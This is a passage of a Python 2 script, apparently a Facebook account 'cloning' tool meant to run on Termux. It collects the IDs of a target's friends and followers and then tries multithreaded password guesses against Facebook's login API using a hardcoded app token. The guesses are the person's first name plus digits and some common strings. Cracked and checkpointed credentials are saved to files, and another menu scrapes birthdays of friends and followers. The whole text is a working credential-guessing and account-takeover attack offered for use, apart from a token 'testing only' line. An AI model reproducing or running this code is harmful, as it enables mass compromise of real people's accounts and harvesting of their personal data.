                                    if 'www.facebook.com' in d['error_msg']:
                                        print("\033[1;90m[\033[1;92mCheckpoint\033[1;90m] "+uid+" "+pass3+" \033[1;97m")
                                        cp=open("cp.txt","a")
                                        cp.write(uid+" | "+pass3+"\n")
                                        cp.close()
                                        cps.append(uid)
                                    else:
                                        if 'access_token' in d:
                                            print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass3+" \033[1;97m")
                                            ok=open("ok.txt","a")
                                            ok.write(uid+" | "+pass3+"\n")
                                            ok.close()
                                            oks.append(uid)
                                        else:

                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
                                            d=json.loads(q)
                                            if 'www.facebook.com' in d['error_msg']:
                                                print("\033[1;90m[\033[1;92mCheckpoint\033[1;90m] "+uid+" "+pass4+" \033[1;97m")
                                                cp=open("cp.txt","a")
                                                cp.write(uid+" | "+pass4+"\n")
                                                cp.close()
                                                cps.append(uid)
                                            else:
                                                if 'access_token' in d:
                                                    print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass4+" \033[1;97m")
                                                    ok=open("ok.txt","a")
                                                    ok.write(uid+" | "+pass4+"\n")
                                                    ok.close()
                                                    oks.append(uid)
                                                else:

                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
                                                    d=json.loads(q)
                                                    if 'www.facebook.com' in d['error_msg']:
                                                        print("\033[1;90m[\033[1;92mCheckpoint\033[1;90m] "+uid+" "+pass5+" \033[1;97m")
                                                        cp=open("cp.txt","a")
                                                        cp.write(uid+" | "+pass5+"\n")
                                                        cp.close()
                                                        cps.append(uid)
                                                    else:
                                                        if 'access_token' in d:
                                                            print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass5+" \033[1;97m")
                                                            ok=open("ok.txt","a")
                                                            ok.write(uid+" | "+pass5+"\n")
                                                            ok.close()
                                                            oks.append(uid)

                except:
                        pass

        p = ThreadPool(30)
        p.map(main, id)
        print("--------------------------------------------------")
        print ('[ok] Process Has Been Completed')
        print('[ok] Total CP/OK:  '+str(len(cps))+'/\033[;32m '+str(len(oks)))
        print("--------------------------------------------------")
        down()
def down():
    dow = raw_input("[?] Do Yoou Want To Download Cp File? (Yes/No) ")
    if dow =="yes" or dow =="y":
        os.system("clear")
        print logo
        download()
        print("[!] Please Give Storage Permission If Ask")
        os.system("termux-setup-storage")
        os.system("cp cp.txt /sdcard")
        print('[ok] File Downloaded Successfully')
        print("[ok] Please Open Your Internal Storage and Rename The File")
        raw_input("Press Enter To Return In Main Menu ")
        method_menu()
    elif dow =="no" or dow=="n":
        method_menu()
    else:
        print("[!] Please Select a Valid Option ")
        down()
def view_token():
    os.system("clear")
    print logo
    print("")
    print("\t    \033[1;32mLogged In Token \033[0;97m")
    print("")
    print(" Token : " )
    os.system("cat .login.txt")
    print("")
    raw_input(" Press enter to main menu ")
    b_menu()
def logout():
    os.system("clear")
    print logo
    print("")
    print("\t    "+c+"Logout Menu"+c2)
    print("")
    raw_input(" Do you really want to logout ? ")
    os.system("rm -rf .login.txt")
    method_menu()
def extract_dob():
    global token
    try:
        token = open(".login.txt","r").read()
    except (KeyError , IOError):
        time.sleep(1)
        login()
    os.system("clear")
    print logo
    print("")
    print("\t    "+c+"Extract DOB Of ID"+c2)
    print("")
    print("[1] Grab from friendlist")
    print("[2] Grab from followers")
    print("[3] Grab single id")
    print("[4] Back")
    print("")
    dob_select()
def dob_select():
	select = raw_input("\n Choose Option >>> ")
	id=[]
	nms=[]
	if select =="1":
		os.system("clear")
		print logo
		print("")
		print("\t    \033[1;32mGrab DOB From Friendlist\033[0;97m")
		print("")
		idt = raw_input(" Put Id/user : ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print(" Target Id : "+q["name"])
		except KeyError:
		    print("")
		    print('\033[1;31mID Not Found'+c2)
		    print("")
		    raw_input("\nPress enter to back ")
		    dob_select()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="2":
		os.system("clear")
		print logo
		print("")
		print("\033[1;32m Grab DOB From Followers\033[0;97m")
		print("")
		idt = raw_input(" Put Id/user : ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print(" Target user : "+q["name"])
		except KeyError:
			print('\t    \033[1;31mID Not Found\033[0;97m')
			raw_input("\nPress enter to back ")
			dob_select()
		#print('[✓] Looking For Accounts')
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="3":
		dob()
	elif select =="4":
	    b_menu()
	else:
	    print("")
	    print ("\t    \033[1;31mSelect valid option\033[0;97m")
	    print("")
	    dob_select()
	print (" Total IDs : "+str(len(id)))
	print(" The Process has started")
	print(" Note : This is for testing only")
	print("")
	print 47*("-")
	print('')

	def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
		    q = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token, headers=header).text
		    d=json.loads(q)
		    y=d['birthday']
		    print("\033[1;32m "+uid+" \033[1;30m "+name+" | "+y+"\033[0;97m")
		    nmb=open("dobs.txt","a")
		    nmb.write(name+' | '+uid+" | "+y+"\n")
		    nmb.close()
		    nms.append(number)
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print('')
	print 47*'-'
	print('')
	print (' Process has completed')
	print(' Total DOB :  '+str(len(nms)))
	print('')
	print 47*('-')
	print('')
	raw_input('\n Press enter to back ')
	extract_dob()
def dob():
    global token
    try:
        token = open(".login.txt","r").read()
    except (KeyError , IOError):
        time.sleep(1)
        login()
    os.system("clear")
    print logo
    print("")
    print("\t    "+c+"Find DOB Of ID"+c2)
    print("")
    idt = raw_input(" Put id/user : ")
    os.system("clear")
    print logo
    print("")
    os.system('echo -e "\t   Finding DOB  " | lolcat')
    time.sleep(1)
    try:
        r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header).text
        z = json.loads(r)
        dobs = z["birthday"]
    except (KeyError , IOError):
        os.system("clear")
        print logo
        print("")
        print("\t    "+c+"Find DOB Of ID"+c2)
        print("")
        print(" DOB not found")
        print("")
        raw_input(" Press enter to try again ")
        extract_dob()
    os.system("clear")
    print logo
    print("")
    print("\t    "+c+"Find DOB Of ID"+c2)
    print("")
    print(" Account ID : "+idt)
    print(" DOB : "+dobs)
    print("")
    print(47*"-")
    print("")
    conf()
def conf():
    ol = raw_input(" Do you want to find again (y/n) ")
    if ol =="y":
        dob()
    elif ol =="n":
        extract_dob()
    else:
        b_menu()
def l_menu():
    global token
    os.system("clear")
    print logo
    try:
        token = open(".login.txt","r").read()
    except (KeyError , IOError):
        login()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token)
        q = json.loads(r.text)
        nm = q["name"]
        nmf = nm.rsplit(" ")[0]
        ok = nmf
    except (KeyError , IOError):
        print("")
        print("\t    "+c+"ID has checkpoint"+c2)
        print("")
        os.system("rm -rf .login.txt")
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        print logo
        print("")
        print("\t    \033[1;31mTurn on mobile data OR wifi\033[0;97m")
        print("")
        time.sleep(1)
        raw_input(" Press enter to try again ")
        b_menu()
    os.system("clear")
    print logo
    print("")
    print(47*"-")
    print("")
    print("\t  "+c+"Logged In User"+ok+c2)
    print("")
    print(47*"-")
    print("")
    print("[1] Crack from public id")
    print("[2] Crack from followers")
    print("[3] Return method menu")
    print("[4] Logout")
    print("")
    l_menu_select()
def l_menu_select():
	select = raw_input("\nChoose Option >>> ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print logo
		print("")
		os.system('echo -e "\t    Public ID Cloning " | lolcat')
		print("")
		idt = raw_input(" Put Id/user :  ")
		os.system("clear")
		print logo
		print("")
		os.system('echo -e "\t    Gathering Information " | lolcat')
		print("")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system("clear")
			print logo
			print("")
			os.system('echo -e "\t    Public ID Cloning " | lolcat')
			print("")
			print(" Target user : "+q["name"])
		except (KeyError , IOError):
		    print("")
		    print("\n\t    \033[1;31m Logged in id has checkpoint\033[0;97m")
		    print("")
		    raw_input("\nPress enter to back ")
		    l_menu()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="2":
		os.system("clear")
		print logo
		print("")
		os.system('echo -e "\t    Public ID Cloning " | lolcat')
		print("")
		idt = raw_input(" Put Id/user : ")
		os.system("clear")
		print logo
		print("")
		os.system('echo -e "\t    Gathering Information " | lolcat')
		print("")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			os.system("clear")
			print logo
			print("")
			os.system('echo -e "\t    Followers Cloning " | lolcat')
			print("")
			print(" Target user : "+q["name"])
		except (KeyError , IOError):
		    print("")
		    print("\n\t    \033[1;31m Logged in id has checkpoint\033[0;97m")
		    print("")
		    raw_input("\n Press enter to back ")
		    l_menu()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="3":
		method_menu()
	elif select =="4":
	    logout()
	else:
	    print("")
	    print("\t    "+c+"Select valid method"+c2)
	    print("")
	    l_menu_select()
	print(" Total IDs : "+str(len(id)))
	time.sleep(0.5)
	print(" The process is running in background")
	print("")
	print 47*("-")
	print('')
	def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
			pass1 = name+"123"
			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
			q = json.loads(data)
			if "loc" in q:
				print("\033[1;32m[Successful] \033[1;30m"+uid+" | "+pass1+"\033[0;97m")
				ok = open("ok.txt","a")
				ok.write(uid+" | "+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error"]:
					print("[Checkpoint] "+uid+" | "+pass1)
					cp = open("cp.txt","a")
					cp.write(uid+" | "+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					pass2 = name+"1234"
					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
					q = json.loads(data)
					if "loc" in q:
						print("\033[1;32m[Successful] \033[1;30m"+uid+" | "+pass2+"\033[0;97m")
						ok = open("ok.txt","a")
						ok.write(uid+" | "+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error"]:
							print("[Checkpoint] "+uid+" | "+pass2)
							cp = open("cp.txt","a")
							cp.write(uid+" | "+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							pass3 = name+"12345"
							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
							q = json.loads(data)
							if "loc" in q:
								print("\033[1;32m[Successful] \033[1;30m"+uid+" | "+pass3+"\033[0;97m")
								ok = open("ok.txt","a")
								ok.write(uid+" | "+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q["error"]:
									print("[Checkpoint] "+uid+" | "+pass3)
									cp = open("cp.txt","a")
									cp.write(uid+" | "+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									pass4 = name+"123456"
									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
									q = json.loads(data)
									if "loc" in q:
										print("\033[1;32m[Successful] \033[1;30m"+uid+" | "+pass4+"\033[0;97m")
										ok = open("ok.txt","a")
										ok.write(uid+" | "+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in q["error"]:
											print("[Checkpoint] "+uid+" | "+pass4)
											cp = open("cp.txt","a")
											cp.write(uid+" | "+pass4+"\n")
											cp.close()
											cps.apppend(uid+pass4)
										else:
											pass5 = "786786"
											data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text
											q = json.loads(data)
											if "loc" in q:
												print("\033[1;32m[Successful] \033[1;30m"+uid+" | "+pass5+"\033[0;97m")
												ok = open("ok.txt","a")
												ok.write(uid+" | "+pass5+"\n")
												ok.close()
												oks.append(uid+pass5)
											else:
												if "www.facebook.com" in q["error"]:
													print("[Checkpoint] "+uid+" | "+pass5)
													cp = open("cp.txt","a")
													cp.write(uid+" | "+pass5+"\n")
													cp.close()
													cps.append(uid+pass5)
												else:
													pass6 = "100200"
													data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass6).text
													q = json.loads(data)
													if "loc" in q:
														print("\033[1;32m[Successful] \033[1;30m"+uid+" | "+pass6+"\033[0;97m")
														ok = open("ok.txt","a")
														ok.write(uid+" | "+pass6+"\n")
														ok.close()
														oks.append(uid+pass6)
													else:
														if "www.facebook.com" in q["error"]:
															print("[Checkpoint] "+uid+" | "+pass6)
															cp = open("cp.txt","a")
															cp.write(uid+" | "+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
														else:
															pass7 = "1122334455"
															data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass7, headers=header).text
															q = json.loads(data)
															if "loc" in q:
																print("\033[1;32m[Successful] \033[1;30m"+uid+" | "+pass7+"\033[0;97m")
																ok = open("ok.txt","a")
																ok.write(uid+" | "+pass7+"\n")
																ok.close()
																oks.append(uid+pass7)
															else:
																if "www.facebook.com" in q["error"]:
																	print("[Checkpoint] "+uid+" | "+pass7)
																	cp = open("cp.txt","a")
																	cp.write(uid+" | "+pass7+"\n")
																	cp.close()
																	cps.append(uid+pass7)
																
		except:
			pass
	
	p = ThreadPool(30)
	p.map(main,id)
	print("")
	print(47*"-")
	print("")
	print(" The process has completed")
	print(" Total Ok/Cp :"+str(len(oks)))+"/"+str(len(cps))
	print("")
	print(47*"-")
	print("")
	raw_input(" Press entet to back ")
	l_menu()
if __name__ == '__main__':
    mohammad()

